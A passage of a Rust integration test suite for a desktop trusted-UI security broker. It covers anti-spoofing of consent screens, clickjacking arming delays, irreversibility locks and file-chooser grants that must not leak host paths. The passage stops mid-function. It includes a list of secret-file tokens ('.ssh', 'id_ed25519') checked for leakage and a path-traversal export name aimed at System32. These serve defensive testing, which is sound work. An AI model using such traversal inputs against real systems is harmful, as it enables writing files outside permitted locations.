//! Stage D (`W71-D-TRUSTED-UI` / `D-TRUSTED-UI`) 不可遮挡 `Z4` 实心安全确认屏、
//! `ChooserGrant` 受限能力经纪器（零宿主裸路径泄露）与污点感知跨应用剪贴板/拖放守卫集成与负例旁路测试。

use llmos_desktop_lib::compositor::WorkstationHostShell;
use llmos_desktop_lib::dto::compositor_snapshot_dto;
use llmos_desktop_lib::input_router::{InputOrigin, InputSource};
use llmos_desktop_lib::ipc::{AppState, SessionConfig};
use llmos_desktop_lib::session::{
    DesktopSessionManager, UserProfile, WorkstationLocale, WorkstationTheme,
};
use llmos_desktop_lib::trusted_ui::{
    ChooserAttenuatedRights, ChooserMode, ConsentGrantScope, ReversibilityClass, TaintFlag,
    TransferChannelKind, TransferReadDecisionDto, TrustedUiAuthority, TrustedUiCallerOrigin,
    TrustedUiErrorCode, TrustedUiState, Z2_SURFACE_Z_CEILING, Z4_CLICKJACK_ARMING_MS,
    Z4_DIALOG_RADIUS_PX, Z4_IRREVERSIBLE_CRIMSON_HEX, Z4_SCRIM_RGBA, Z4_SEAL_HEIGHT_PX,
    Z4_SEAL_WIDTH_PX, Z4_SECURITY_Z_INDEX, Z4_TOP_SECURITY_BAR_HEIGHT_PX, Z4ActionScopeSpec,
    Z4BlastRadiusRowDto, Z4ChallengeState, Z4ConsentChallengeRequest, Z4RequestingAppSpec,
    Z4ResourceCeilingSpec, Z4ReversibilityRiskSpec, parse_hex_id_16, sha256_bytes,
    trusted_ui_complete_escalated_transfer_core, trusted_ui_confirm_chooser_grant_core,
    trusted_ui_decide_z4_consent_core, trusted_ui_get_public_posture_core,
    trusted_ui_get_security_audit_core, trusted_ui_mint_gesture_token_core,
    trusted_ui_notify_z4_focus_regained_core, trusted_ui_open_chooser_core,
    trusted_ui_open_z4_consent_core, trusted_ui_publish_transfer_core,
    trusted_ui_request_transfer_read_core, trusted_ui_revoke_chooser_grant_core,
};

fn hex(bytes: &[u8]) -> String {
    bytes.iter().map(|b| format!("{b:02x}")).collect()
}

fn sample_z4_request(reversibility: ReversibilityClass) -> Z4ConsentChallengeRequest {
    Z4ConsentChallengeRequest {
        requesting_app: Z4RequestingAppSpec {
            display_name: "账务核对工作台".to_owned(),
            publisher_name: "NLOS Verified Publisher".to_owned(),
            signature_verified: true,
            application_id_hex: hex(&[0xA1; 16]),
            installation_id_hex: hex(&[0xB2; 16]),
            principal_id_hex: hex(&[0x01; 16]),
            installation_generation: 3,
            manifest_digest_hex: hex(&sha256_bytes(b"manifest:ledger-workbench:v3")),
        },
        action_scope: Z4ActionScopeSpec {
            plain_summary_zh: "向外部银行网关提交本季度结算批次并归档清理临时主题记录".to_owned(),
            plain_summary_en:
                "Submit quarterly settlement batch to external bank gateway and purge staging logs"
                    .to_owned(),
            capability_rights: vec![
                "EXTERNAL_SETTLEMENT_SUBMIT".to_owned(),
                "TOPIC_RETENTION_PURGE".to_owned(),
            ],
            control_scope: "TASK_GROUP".to_owned(),
            plan_digest_hex: hex(&sha256_bytes(b"plan:q3-settlement-batch")),
        },
        resource_ceiling: Z4ResourceCeilingSpec {
            plain_ceiling_zh: "内存上限 256 MiB · 预算上限 12,000 单位 · 允许受控外网连接 · 最长 30 秒"
                .to_owned(),
            plain_ceiling_en:
                "Memory cap 256 MiB · Budget cap 12,000 units · Controlled egress allowed · Max 30s"
                    .to_owned(),
            memory_ceiling_mib: 256,
            token_budget_ceiling: 12_000,
            network_egress_allowed: true,
            max_duration_ms: 30_000,
        },
        reversibility_and_risk: Z4ReversibilityRiskSpec {
            reversibility_class: reversibility,
            plain_consequence_zh: match reversibility {
                ReversibilityClass::Irreversible => {
                    "资金结算指令发出且临时记录清除后无法撤回，系统仅保留不可篡改回执凭证。".to_owned()
                }
                ReversibilityClass::CompensatableRollback => {
                    "可通过补偿冲正流程回退状态，但会保留完整审计轨迹。".to_owned()
                }
                ReversibilityClass::LosslessUndo => {
                    "仅修改本地草稿快照，可随时无损撤销恢复原状。".to_owned()
                }
            },
            plain_consequence_en: match reversibility {
                ReversibilityClass::Irreversible => {
                    "Once dispatched and purged, external settlement cannot be undone; only an audit proof remains."
                        .to_owned()
                }
                ReversibilityClass::CompensatableRollback => {
                    "State can be rolled back via compensating reversal with full audit trail."
                        .to_owned()
                }
                ReversibilityClass::LosslessUndo => {
                    "Modifies local draft snapshot only and supports lossless undo.".to_owned()
                }
            },
            multi_target_count: 4,
            partial_failure_disclosure_zh: None,
            partial_failure_disclosure_en: None,
            blast_radius_rows: vec![
                Z4BlastRadiusRowDto {
                    symbol: "+".to_owned(),
                    category: "created".to_owned(),
                    scope_label: "外部回执".to_owned(),
                    target_label: "季度结算批次凭证".to_owned(),
                    reason: "写入审计账本".to_owned(),
                    target_id_hex: Some(hex(&[0xC1; 16])),
                },
                Z4BlastRadiusRowDto {
                    symbol: "-".to_owned(),
                    category: "purged".to_owned(),
                    scope_label: "临时主题".to_owned(),
                    target_label: "对账中间流日志".to_owned(),
                    reason: "不可恢复清理".to_owned(),
                    target_id_hex: Some(hex(&[0xC2; 16])),
                },
            ],
            requires_data_loss_receipt: false,
        },
        allowed_grant_scopes: vec![
            ConsentGrantScope::SingleAction,
            ConsentGrantScope::CurrentTask,
            ConsentGrantScope::CurrentSession,
        ],
    }
}

// ============================================================================
// 1. Z4 实心几何、防钓鱼安全印章严格隔离与 Z2 欺骗/越界遮挡拦截 ([TUI-CONSENT-001], [TUI-SEAL-001])
// ============================================================================

#[test]
fn z4_solid_geometry_seal_confinement_and_untrusted_z2_spoof_occlusion_rejection() {
    let mut shell = WorkstationHostShell::new_default_workstation();
    let mut auth = TrustedUiAuthority::new();
    let private_seal = shell
        .session
        .active_user()
        .expect("active user")
        .z4_trusted_seal_hint()
        .to_owned();
    assert!(!private_seal.is_empty());

    // 负例 1：不可信 Z2 应用窗口试图伪造打开 Z4 安全提示屏 -> 必须被确定性拒绝并计入审计。
    let forge_err = auth
        .z4_broker
        .open_consent_challenge(
            TrustedUiCallerOrigin::UntrustedZ2Surface {
                surface_id: [0x91; 16],
                application_id: [0xA1; 16],
                requested_z_index: None,
            },
            &shell.session,
            sample_z4_request(ReversibilityClass::LosslessUndo),
            1_000,
            &mut auth.audit,
        )
        .expect_err("untrusted Z2 surface must not forge Z4 prompt");
    assert_eq!(forge_err.code, TrustedUiErrorCode::UntrustedZ4ForgeAttempt);
    assert_eq!(auth.audit.rejected_untrusted_z4_forge_attempts, 1);

    // 负例 2：不可信 Z2 表面申请 z-index >= 300 或 >= 900 试图遮挡 Z4 -> 必须被拒绝。
    let occlude_err = auth
        .z4_broker
        .open_consent_challenge(
            TrustedUiCallerOrigin::UntrustedZ2Surface {
                surface_id: [0x91; 16],
                application_id: [0xA1; 16],
                requested_z_index: Some(900),
            },
            &shell.session,
            sample_z4_request(ReversibilityClass::LosslessUndo),
            1_010,
            &mut auth.audit,
        )
        .expect_err("untrusted Z2 surface claiming z-index 900 must be rejected");
    assert_eq!(
        occlude_err.code,
        TrustedUiErrorCode::Z4PlaneOcclusionRejected
    );
    let direct_z_err = auth
        .z4_broker
        .guard_plane_z_index(
            TrustedUiCallerOrigin::UntrustedZ2Surface {
                surface_id: [0x91; 16],
                application_id: [0xA1; 16],
                requested_z_index: Some(Z2_SURFACE_Z_CEILING + 1),
            },
            Z2_SURFACE_Z_CEILING + 1,
            &mut auth.audit,
        )
        .expect_err("z-index 300 must exceed Z2 ceiling 299");
    assert_eq!(
        direct_z_err.code,
        TrustedUiErrorCode::Z4PlaneOcclusionRejected
    );
    assert_eq!(auth.audit.rejected_z4_occlusion_attempts, 2);

    // 正例：TCB TrustedUiBroker 打开 Z4 安全确认屏。
    let projected = auth
        .z4_broker
        .open_consent_challenge(
            TrustedUiCallerOrigin::TcbTrustedBroker,
            &shell.session,
            sample_z4_request(ReversibilityClass::Irreversible),
            2_000,
            &mut auth.audit,
        )
        .expect("TCB broker must open Z4 challenge");
    auth.sync_with_host_shell(&mut shell, 2_000);
    assert!(shell.route.z4_modal_lock);

    // 校验实心 Z4 几何硬规格与私密防钓鱼印章存在性。
    assert_eq!(projected.z_index, Z4_SECURITY_Z_INDEX);
    assert_eq!(projected.z_index, 900);
    assert_eq!(projected.scrim_rgba, Z4_SCRIM_RGBA);
    assert!(projected.zero_blur_filter);
    assert_eq!(projected.dialog_radius_px, Z4_DIALOG_RADIUS_PX);
    assert_eq!(projected.top_security_bar_px, Z4_TOP_SECURITY_BAR_HEIGHT_PX);
    assert_eq!(projected.seal_width_px, Z4_SEAL_WIDTH_PX);
    assert_eq!(projected.seal_height_px, Z4_SEAL_HEIGHT_PX);
    assert_eq!(projected.security_seal_hint, private_seal);

    // 负例 3：不可信 Z2 表面试图读取含 security_seal_hint 的 Z4 投影 -> 拒绝！
    let challenge_id =
        parse_hex_id_16("challenge_id", &projected.challenge_id_hex).expect("valid hex");
    let seal_read_err = auth
        .z4_broker
        .project_trusted_challenge(
            TrustedUiCallerOrigin::UntrustedZ2Surface {
                surface_id: [0x91; 16],
                application_id: [0xA1; 16],
                requested_z_index: None,
            },
            &shell.session,
            challenge_id,
            &mut auth.audit,
        )
        .expect_err("untrusted Z2 must not read Z4 seal hint");
    assert_eq!(
        seal_read_err.code,
        TrustedUiErrorCode::UntrustedSealReadDenied
    );
    assert_eq!(auth.audit.rejected_untrusted_seal_reads, 1);

    // 校验 Z0..Z3 公共姿态 DTO 与合成器快照均绝对不泄露 security_seal_hint。
    let public_posture = auth.project_lower_plane_posture(&shell.session);
    let posture_json = serde_json::to_string(&public_posture).expect("serialize posture");
    assert!(!posture_json.contains(&private_seal));
    assert!(!posture_json.contains("securitySealHint"));

    let comp_snapshot =
        compositor_snapshot_dto(&shell, false).expect("lower-plane compositor snapshot");
    let comp_json = serde_json::to_string(&comp_snapshot).expect("serialize compositor");
    assert!(!comp_json.contains(&private_seal));
}

// ============================================================================
// 2. 4 行规格表、IRREVERSIBLE 法定不可撤销锁、多目标局部失败披露与数据丢失回执 ([RCPT-UNDO-001], [RCPT-PARTIAL-001])
// ============================================================================

#[test]
fn z4_four_row_spec_irreversible_statutory_lock_and_partial_failure_disclosure() {
    let session = DesktopSessionManager::default_workstation();
    let mut auth = TrustedUiAuthority::new();

    let dto = auth
        .z4_broker
        .open_consent_challenge(
            TrustedUiCallerOrigin::TcbTrustedBroker,
            &session,
            sample_z4_request(ReversibilityClass::Irreversible),
            10_000,
            &mut auth.audit,
        )
        .expect("open irreversible Z4 challenge");

    // 法定锁断言：IRREVERSIBLE 禁止撤销入口、强制高对比度显式勾选、深红警示色、自动填充多目标风险与数据丢失回执标记。
    assert!(!dto.undo_affordance_allowed);
    assert!(dto.requires_high_contrast_ack);
    assert_eq!(
        dto.statutory_lock_kind.as_deref(),
        Some("IRREVERSIBLE_NO_UNDO")
    );
    assert_eq!(
        dto.signal_color_hex.as_deref(),
        Some(Z4_IRREVERSIBLE_CRIMSON_HEX)
    );
    assert!(dto.reversibility_and_risk.requires_data_loss_receipt);
    assert!(
        dto.reversibility_and_risk
            .partial_failure_disclosure_zh
            .as_deref()
            .is_some_and(|s| s.contains('4'))
    );
    assert!(
        dto.reversibility_and_risk
            .partial_failure_disclosure_en
            .as_deref()
            .is_some_and(|s| s.contains("4 targets"))
    );

    let challenge_id = parse_hex_id_16("challenge_id", &dto.challenge_id_hex).expect("valid id");

    // 负例：已超过 350ms (t = 10_400ms)，但未勾选高对比度不可逆确认 -> 必须被拒绝且挑战保持 Pending！
    let missing_ack_err = auth
        .z4_broker
        .decide_consent_challenge(
            InputOrigin::TrustedShell,
            InputSource::Pointer,
            &session,
            challenge_id,
            true,
            Some(ConsentGrantScope::SingleAction),
            false,
            10_400,
            &mut auth.audit,
        )
        .expect_err("IRREVERSIBLE confirm without explicit ack must fail");
    assert_eq!(
        missing_ack_err.code,
        TrustedUiErrorCode::IrreversibleHighContrastAckRequired
    );
    assert_eq!(auth.audit.rejected_irreversible_ack_missing, 1);
    assert_eq!(
        auth.z4_broker.challenge_state(challenge_id),
        Some(Z4ChallengeState::Pending)
    );

    // 正例：显式勾选不可逆确认后批准成功。
    let receipt = auth
        .z4_broker
        .decide_consent_challenge(
            InputOrigin::TrustedShell,
            InputSource::Pointer,
            &session,
            challenge_id,
            true,
            Some(ConsentGrantScope::CurrentTask),
            true,
            10_420,
            &mut auth.audit,
        )
        .expect("IRREVERSIBLE confirm with explicit ack must succeed");
    assert_eq!(receipt.state, Z4ChallengeState::Approved);
    assert!(!receipt.undo_affordance_allowed);
    assert!(receipt.requires_data_loss_receipt);

    // 负例：对 IRREVERSIBLE 回执强行发起撤销请求 -> 法定锁确定性拒绝！
    let receipt_id = parse_hex_id_16("receipt_id", &receipt.receipt_id_hex).expect("valid id");
    let undo_err = auth
        .z4_broker
        .request_undo_for_receipt(receipt_id, &mut auth.audit)
        .expect_err("IRREVERSIBLE receipt must reject undo");
    assert_eq!(
        undo_err.code,
        TrustedUiErrorCode::IrreversibleStatutoryLockViolation
    );
    assert_eq!(auth.audit.rejected_irreversible_undo_attempts, 1);

    // 对照正例：LOSSLESS_UNDO 回执允许无损撤销。
    let lossless_dto = auth
        .z4_broker
        .open_consent_challenge(
            TrustedUiCallerOrigin::TcbTrustedBroker,
            &session,
            sample_z4_request(ReversibilityClass::LosslessUndo),
            20_000,
            &mut auth.audit,
        )
        .expect("open lossless challenge");
    assert!(lossless_dto.undo_affordance_allowed);
    assert!(!lossless_dto.requires_high_contrast_ack);
    let lossless_cid =
        parse_hex_id_16("lossless_cid", &lossless_dto.challenge_id_hex).expect("valid id");
    let lossless_rcpt = auth
        .z4_broker
        .decide_consent_challenge(
            InputOrigin::TrustedShell,
            InputSource::Keyboard,
            &session,
            lossless_cid,
            true,
            Some(ConsentGrantScope::SingleAction),
            false,
            20_360,
            &mut auth.audit,
        )
        .expect("lossless confirm");
    let lossless_rid =
        parse_hex_id_16("lossless_rid", &lossless_rcpt.receipt_id_hex).expect("valid id");
    let undo_ok = auth
        .z4_broker
        .request_undo_for_receipt(lossless_rid, &mut auth.audit)
        .expect("lossless undo allowed");
    assert_eq!(undo_ok, "LOSSLESS_UNDO_DISPATCHED");
}

// ============================================================================
// 3. 350ms 防点击劫持武装窗（含焦点重获重武装）、0ms Escape 即时取消与会话锁屏/切换用户失效 ([TUI-GUARD-001])
// ============================================================================

#[test]
fn z4_350ms_arming_guard_focus_regain_reset_zero_ms_escape_and_session_fence() {
    let mut shell = WorkstationHostShell::new_default_workstation();
    let second_principal = [0x77; 16];
    let second_profile = UserProfile::with_isolated_scopes(
        second_principal,
        "Operator Bob",
        "北极星-7391",
        WorkstationLocale::EnUs,
        WorkstationTheme::PaperWorkstation,
    )
    .expect("create second user");
    shell
        .session
        .register_user_with_default_workspace(second_profile, [0x78; 16], "Bob Workspace")
        .expect("register second user");

    let mut auth = TrustedUiAuthority::new();
    let challenge = auth
        .z4_broker
        .open_consent_challenge(
            TrustedUiCallerOrigin::TcbTrustedBroker,
            &shell.session,
            sample_z4_request(ReversibilityClass::CompensatableRollback),
            5_000,
            &mut auth.audit,
        )
        .expect("open challenge");
    let cid = parse_hex_id_16("cid", &challenge.challenge_id_hex).expect("valid id");

    // 负例 1：0ms 与 349ms 内抢先合成点击确认 -> 拒绝！
    for early_ms in [5_000_u64, 5_120, 5_349] {
        let err = auth
            .z4_broker
            .decide_consent_challenge(
                InputOrigin::TrustedShell,
                InputSource::Pointer,
                &shell.session,
                cid,
                true,
                Some(ConsentGrantScope::SingleAction),
                false,
                early_ms,
                &mut auth.audit,
            )
            .expect_err("click within < 350ms arming window must be rejected");
        assert_eq!(err.code, TrustedUiErrorCode::ClickjackingArmingActive);
    }
    assert_eq!(auth.audit.rejected_clickjacking_arming_attempts, 3);

    // 负例 2：即使已过 350ms，不可信 Z2 表面或 Automation 自动化注入确认仍被拒绝！
    let spoof_err = auth
        .z4_broker
        .decide_consent_challenge(
            InputOrigin::UntrustedApplicationSurface {
                surface_id: [0x12; 16],
                application_id: [0xA1; 16],
            },
            InputSource::Pointer,
            &shell.session,
            cid,
            true,
            None,
            false,
            5_500,
            &mut auth.audit,
        )
        .expect_err("untrusted Z2 confirm spoof must fail");
    assert_eq!(spoof_err.code, TrustedUiErrorCode::UntrustedInputOrigin);

    let auto_err = auth
        .z4_broker
        .decide_consent_challenge(
            InputOrigin::TrustedShell,
            InputSource::Automation,
            &shell.session,
            cid,
            true,
            None,
            false,
            5_500,
            &mut auth.audit,
        )
        .expect_err("automation confirm must fail");
    assert_eq!(auto_err.code, TrustedUiErrorCode::UntrustedInputOrigin);
    assert_eq!(auth.audit.rejected_untrusted_confirm_spoofs, 2);

    // 负例 3：t = 5_600ms 发生焦点重获 -> 武装起点重置为 5_600ms，因此 t = 5_949ms (+349ms) 再次被拦，t = 5_950ms (+350ms) 放行！
    let armed_from = auth
        .z4_broker
        .notify_focus_regained(
            TrustedUiCallerOrigin::TcbTrustedBroker,
            cid,
            5_600,
            &mut auth.audit,
        )
        .expect("focus regained");
    assert_eq!(armed_from, 5_600);

    let after_refocus_early = auth
        .z4_broker
        .decide_consent_challenge(
            InputOrigin::TrustedShell,
            InputSource::Keyboard,
            &shell.session,
            cid,
            true,
            None,
            false,
            5_600 + Z4_CLICKJACK_ARMING_MS - 1,
            &mut auth.audit,
        )
        .expect_err("< 350ms after focus regain must be rejected");
    assert_eq!(
        after_refocus_early.code,
        TrustedUiErrorCode::ClickjackingArmingActive
    );

    let approved = auth
        .z4_broker
        .decide_consent_challenge(
            InputOrigin::TrustedShell,
            InputSource::Keyboard,
            &shell.session,
            cid,
            true,
            Some(ConsentGrantScope::CurrentSession),
            false,
            5_600 + Z4_CLICKJACK_ARMING_MS,
            &mut auth.audit,
        )
        .expect(">= 350ms after focus regain must succeed");
    assert_eq!(approved.state, Z4ChallengeState::Approved);

    // 正例：0ms Escape 取消立即可用，不受 350ms 武装门阻塞。
    let esc_challenge = auth
        .z4_broker
        .open_consent_challenge(
            TrustedUiCallerOrigin::TcbTrustedBroker,
            &shell.session,
            sample_z4_request(ReversibilityClass::Irreversible),
            8_000,
            &mut auth.audit,
        )
        .expect("open second challenge");
    let esc_cid = parse_hex_id_16("esc_cid", &esc_challenge.challenge_id_hex).expect("valid id");
    let cancelled = auth
        .z4_broker
        .decide_consent_challenge(
            InputOrigin::TrustedShell,
            InputSource::Keyboard,
            &shell.session,
            esc_cid,
            false,
            None,
            false,
            8_000, // 0ms!
            &mut auth.audit,
        )
        .expect("0ms Escape cancel must immediately succeed");
    assert_eq!(cancelled.state, Z4ChallengeState::CancelledByUser);

    // 会话围栏：打开挂起挑战后执行锁屏/切换用户 -> 立即作废挂起挑战并解除 z4_modal_lock。
    let lock_challenge = auth
        .z4_broker
        .open_consent_challenge(
            TrustedUiCallerOrigin::TcbTrustedBroker,
            &shell.session,
            sample_z4_request(ReversibilityClass::LosslessUndo),
            9_000,
            &mut auth.audit,
        )
        .expect("open challenge before lock");
    let lock_cid = parse_hex_id_16("lock_cid", &lock_challenge.challenge_id_hex).expect("valid id");
    auth.sync_with_host_shell(&mut shell, 9_000);
    assert!(shell.route.z4_modal_lock);

    shell
        .transition_session("lock", None, Some(9_100))
        .expect("lock session");
    auth.sync_with_host_shell(&mut shell, 9_100);
    assert!(!shell.route.z4_modal_lock);
    assert_eq!(
        auth.z4_broker.challenge_state(lock_cid),
        Some(Z4ChallengeState::InvalidatedBySessionFence)
    );

    shell
        .transition_session("unlock", None, Some(9_200))
        .expect("unlock session");
    let stale_confirm_err = auth
        .z4_broker
        .decide_consent_challenge(
            InputOrigin::TrustedShell,
            InputSource::Pointer,
            &shell.session,
            lock_cid,
            true,
            None,
            false,
            9_900,
            &mut auth.audit,
        )
        .expect_err("challenge from pre-lock generation must remain invalidated");
    assert_eq!(
        stale_confirm_err.code,
        TrustedUiErrorCode::SessionNotActiveOrStaleGeneration
    );

    // 切换用户同样作废挂起挑战且隔离不同用户的 security_seal_hint。
    let switch_challenge = auth
        .z4_broker
        .open_consent_challenge(
            TrustedUiCallerOrigin::TcbTrustedBroker,
            &shell.session,
            sample_z4_request(ReversibilityClass::LosslessUndo),
            10_000,
            &mut auth.audit,
        )
        .expect("open before user switch");
    let switch_cid =
        parse_hex_id_16("switch_cid", &switch_challenge.challenge_id_hex).expect("valid id");
    shell
        .transition_session("switch_user", Some(second_principal), Some(10_100))
        .expect("switch to second user");
    auth.sync_with_host_shell(&mut shell, 10_100);
    assert_eq!(
        auth.z4_broker.challenge_state(switch_cid),
        Some(Z4ChallengeState::InvalidatedBySessionFence)
    );
}

// ============================================================================
// 4. ChooserGrantBroker 受限能力与零宿主裸路径/兄弟文件泄露验证 ([TUI-CHOOSER-001], [DUI-CHOOSER-001])
// ============================================================================

#[test]
fn chooser_grant_attenuated_rights_zero_bare_path_leak_and_revocation_fences() {
    let mut shell = WorkstationHostShell::new_default_workstation();
    let mut auth = TrustedUiAuthority::new();
    let app_alpha = [0xA1; 16];
    let app_beta = [0xB2; 16];

    // 负例 1：SHARE 模式请求写权限或不可信 Z2 直接枚举目录 -> 拒绝！
    let mode_ceiling_err = auth
        .chooser_broker
        .open_chooser_session(
            TrustedUiCallerOrigin::TcbTrustedBroker,
            &shell.session,
            app_alpha,
            "报表分析器",
            ChooserMode::Share,
            ChooserAttenuatedRights::ReadWriteSingle,
            60_000,
            1_000,
            &mut auth.audit,
        )
        .expect_err("SHARE mode must forbid ReadWriteSingle");
    assert_eq!(
        mode_ceiling_err.code,
        TrustedUiErrorCode::ChooserRightsExceedModeCeiling
    );

    let untrusted_enum_err = auth
        .chooser_broker
        .open_chooser_session(
            TrustedUiCallerOrigin::UntrustedZ2Surface {
                surface_id: [0x51; 16],
                application_id: app_alpha,
                requested_z_index: None,
            },
            &shell.session,
            app_alpha,
            "报表分析器",
            ChooserMode::Open,
            ChooserAttenuatedRights::ReadOnly,
            60_000,
            1_000,
            &mut auth.audit,
        )
        .expect_err("untrusted Z2 must not directly pull TCB chooser catalog");
    assert_eq!(
        untrusted_enum_err.code,
        TrustedUiErrorCode::UntrustedZ4ForgeAttempt
    );

    // 正例：打开 OPEN (READ_ONLY) 系统选择器，仅选中单个条目 [0x11; 16]。
    let chooser_session = auth
        .chooser_broker
        .open_chooser_session(
            TrustedUiCallerOrigin::TcbTrustedBroker,
            &shell.session,
            app_alpha,
            "报表分析器",
            ChooserMode::Open,
            ChooserAttenuatedRights::ReadOnly,
            10_000,
            2_000,
            &mut auth.audit,
        )
        .expect("open chooser session");
    let csid = parse_hex_id_16("csid", &chooser_session.chooser_session_id_hex).expect("valid id");

    // 负例 2：< 350ms 点击确认选择器 -> 拒绝！
    let early_err = auth
        .chooser_broker
        .confirm_chooser_grant(
            InputOrigin::TrustedShell,
            InputSource::Pointer,
            &shell.session,
            csid,
            &[[0x11; 16]],
            None,
            None,
            2_200,
            &mut auth.audit,
        )
        .expect_err("chooser confirm within 350ms must fail");
    assert_eq!(early_err.code, TrustedUiErrorCode::ClickjackingArmingActive);

    // 正例：>= 350ms 确认签发 ChooserGrantForAppDto。
    let app_grant = auth
        .chooser_broker
        .confirm_chooser_grant(
            InputOrigin::TrustedShell,
            InputSource::Pointer,
            &shell.session,
            csid,
            &[[0x11; 16]],
            None,
            None,
            2_400,
            &mut auth.audit,
        )
        .expect("chooser confirm after 350ms");

    assert_eq!(app_grant.scoped_handles.len(), 1);
    assert_eq!(
        app_grant.attenuated_rights,
        ChooserAttenuatedRights::ReadOnly
    );
    assert_eq!(app_grant.grant_digest_hex.len(), 64);

    // 核心零宿主裸路径与零兄弟文件泄露断言！
    let serialized_for_app =
        serde_json::to_string(&app_grant).expect("serialize ChooserGrantForAppDto");
    for forbidden_leak in [
        r"C:\",
        "C:/",
        "Users",
        "operator",
        "Documents",
        "Finance",
        "/home/",
        ".ssh",
        "id_ed25519",
        "master-recovery.seed",
        "design-review-brief.md",
        "host_backing_path",
    ] {
        assert!(
            !serialized_for_app.contains(forbidden_leak),
            "ChooserGrantForAppDto leaked forbidden host path or unselected sibling token `{forbidden_leak}`: {serialized_for_app}"
        );
    }

    let grant_id = parse_hex_id_16("grant_id", &app_grant.grant_id_hex).expect("valid grant_id");
    let handle_id = parse_hex_id_16(
        "handle_id",
        &app_grant.scoped_handles[0].scoped_handle_id_hex,
    )
    .expect("valid handle_id");

    // TCB 内部仍能解析真实宿主路径，但仅限 TCB 内部对象持有。
    let backing = auth
        .chooser_broker
        .tcb_resolve_backing_entry(grant_id, handle_id)
        .expect("TCB resolves backing entry");
    assert!(
        backing
            .tcb_only_host_backing_path()
            .contains("q3-financial-ledger.csv")
    );

    // 正例：请求方应用以 READ_ONLY 行使该句柄成功。
    let exercised = auth
        .chooser_broker
        .exercise_chooser_grant(
            grant_id,
            app_alpha,
            handle_id,
            ChooserAttenuatedRights::ReadOnly,
            &shell.session,
            3_000,
            &mut auth.audit,
        )
        .expect("exercise READ_ONLY handle");
    assert_eq!(exercised.display_name, "q3-financial-ledger.csv");

    // 负例 3：越权尝试写操作 -> ChooserGrantInsufficientRights。
    let write_err = auth
        .chooser_broker
        .exercise_chooser_grant(
            grant_id,
            app_alpha,
            handle_id,
            ChooserAttenuatedRights::ReadWriteSingle,
            &shell.session,
            3_010,
            &mut auth.audit,
        )
        .expect_err("READ_ONLY grant must reject write");
    assert_eq!(
        write_err.code,
        TrustedUiErrorCode::ChooserGrantInsufficientRights
    );

    // 负例 4：其他应用盗用该 ChooserGrant -> ChooserGrantApplicationMismatch。
    let wrong_app_err = auth
        .chooser_broker
        .exercise_chooser_grant(
            grant_id,
            app_beta,
            handle_id,
            ChooserAttenuatedRights::ReadOnly,
            &shell.session,
            3_020,
            &mut auth.audit,
        )
        .expect_err("other app must be rejected");
    assert_eq!(
        wrong_app_err.code,
        TrustedUiErrorCode::ChooserGrantApplicationMismatch
    );

    // 负例 5：伪造或请求未选中条目的句柄 -> ChooserGrantHandleOutOfScope。
    let out_of_scope_err = auth
        .chooser_broker
        .exercise_chooser_grant(
            grant_id,
            app_alpha,
            [0x33; 16],
            ChooserAttenuatedRights::ReadOnly,
            &shell.session,
            3_030,
            &mut auth.audit,
        )
        .expect_err("unselected handle must be rejected");
    assert_eq!(
        out_of_scope_err.code,
        TrustedUiErrorCode::ChooserGrantHandleOutOfScope
    );

    // 负例 6：超过 expires_at_mono_ms (2_400 + 10_000 = 12_400) -> ChooserGrantExpired。
    let expired_err = auth
        .chooser_broker
        .exercise_chooser_grant(
            grant_id,
            app_alpha,
            handle_id,
            ChooserAttenuatedRights::ReadOnly,
            &shell.session,
            12_400,
            &mut auth.audit,
        )
        .expect_err("expired ChooserGrant must fail");
    assert_eq!(expired_err.code, TrustedUiErrorCode::ChooserGrantExpired);

    // SAVE 模式路径遍历拦截 + 合法导出句柄签发 + 显式吊销 + 会话锁屏吊销。
    let save_session = auth
        .chooser_broker
        .open_chooser_session(
            TrustedUiCallerOrigin::TcbTrustedBroker,
            &shell.session,
            app_alpha,
            "报表分析器",
            ChooserMode::Save,
            ChooserAttenuatedRights::ExportSave,
            30_000,
            20_000,
            &mut auth.audit,
        )
        .expect("open save chooser");
    let save_csid =
        parse_hex_id_16("save_csid", &save_session.chooser_session_id_hex).expect("valid id");

    let traversal_err = auth
        .chooser_broker
        .confirm_chooser_grant(
            InputOrigin::TrustedShell,
            InputSource::Keyboard,
            &shell.session,
            save_csid,
            &[],
            Some(r"..\..\Windows\System32\evil.dll"),
            Some("application/octet-stream"),
            20_500,
            &mut auth.audit,
        )
        .expect_err("SAVE path traversal must fail");
    assert_eq!(
        traversal_err.code,
        TrustedUiErrorCode::ChooserInvalidExportName
    );

    let save_grant = auth
        .chooser_broker
        .confirm_chooser_grant(
            InputOrigin::TrustedShell,
            InputSource::Keyboard,
            &shell.session,
            save_csid,
            &[],
            Some("q3-summary-export.pdf"),
            Some("application/pdf"),
            20_510,
            &mut auth.audit,
        )
        .expect("clean export leaf name succeeds");
    let save_gid = parse_hex_id_16("save_gid", &save_grant.grant_id_hex).expect("valid id");
    let save_hid = parse_hex_id_16(
        "save_hid",
        &save_grant.scoped_handles[0].scoped_handle_id_hex,
    )
    .expect("valid id");

    // 显式吊销立即生效。
    auth.chooser_broker
        .revoke_chooser_grant(save_gid, &mut auth.audit)
        .expect("revoke grant");
    let revoked_err = auth
        .chooser_broker
        .exercise_chooser_grant(
            save_gid,
            app_alpha,
            save_hid,
            ChooserAttenuatedRights::ExportSave,
            &shell.session,
            20_600,
            &mut auth.audit,
        )
        .expect_err("revoked grant must fail");
    assert_eq!(revoked_err.code, TrustedUiErrorCode::ChooserGrantRevoked);

    // 会话锁屏自动吊销其余活动会话级 ChooserGrant。
    let share_session = auth
        .chooser_broker
        .open_chooser_session(
            TrustedUiCallerOrigin::TcbTrustedBroker,
            &shell.session,
            app_alpha,
            "报表分析器",
            ChooserMode::Share,
            ChooserAttenuatedRights::ReadOnly,
            60_000,
            21_000,
            &mut auth.audit,
        )
        .expect("open share chooser");
    let share_csid =
        parse_hex_id_16("share_csid", &share_session.chooser_session_id_hex).expect("valid id");
    let share_grant = auth
        .chooser_broker
        .confirm_chooser_grant(
            InputOrigin::TrustedShell,
            InputSource::Pointer,
            &shell.session,
            share_csid,
            &[[0x22; 16]],
            None,
            None,
            21_400,
            &mut auth.audit,
        )
        .expect("confirm share grant");
    let share_gid = parse_hex_id_16("share_gid", &share_grant.grant_id_hex).expect("valid id");
    let share_hid = parse_hex_id_16(
        "share_hid",
        &share_grant.scoped_handles[0].scoped_handle_id_hex,
    )
    .expect("valid id");

    shell
        .transition_session("lock", None, Some(22_000))
        .expect("lock session");
    shell
        .transition_session("unlock", None, Some(22_100))
        .expect("unlock to next generation");
    let stale_session_grant_err = auth
        .chooser_broker
        .exercise_chooser_grant(
